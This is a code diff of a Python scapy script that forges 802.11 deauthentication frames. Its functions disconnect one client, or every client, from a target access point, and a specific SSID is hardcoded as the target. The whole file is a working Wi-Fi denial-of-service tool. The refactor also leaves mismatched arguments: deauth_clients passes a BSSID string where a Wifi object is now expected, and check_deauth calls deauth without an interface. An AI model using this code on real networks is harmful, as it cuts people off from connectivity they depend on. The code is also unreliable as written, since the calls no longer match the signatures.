@@ -1,4 +1,5 @@
 from scapy.all import sendp, Dot11Elt, Dot11, RadioTap, Dot11Deauth
+from wifi import Wifi
 
 
 def check_deauth(pkt):
@@ -11,17 +12,17 @@ def check_deauth(pkt):
     deauth(pkt[Dot11].addr1, pkt[Dot11].addr2)
 
 
-def deauth(iface: str, bssid: str, client: str, reason: int = 7):
+def deauth(iface: str, wifi: Wifi, client: str, reason: int = 7):
     packet = RadioTap() / \
-        Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid) / \
+        Dot11(type=0, subtype=12, addr1=client, addr2=wifi.BSSID, addr3=wifi.BSSID) / \
         Dot11Deauth(reason=reason)
     sendp(packet, iface=iface)
 
 
-def deauth_clients(iface: str, clients: list[str], AP_mac: str, reasoncode: int = 6):
+def deauth_clients(iface: str, wifi: Wifi, reasoncode: int = 6):
 
-    for client in clients:
-        deauth(iface, AP_mac, client, reason=reasoncode)
+    for client in wifi.clients:
+        deauth(iface, wifi.BSSID, client, reason=reasoncode)
 
 
 SSID = "b'Sams 9'"
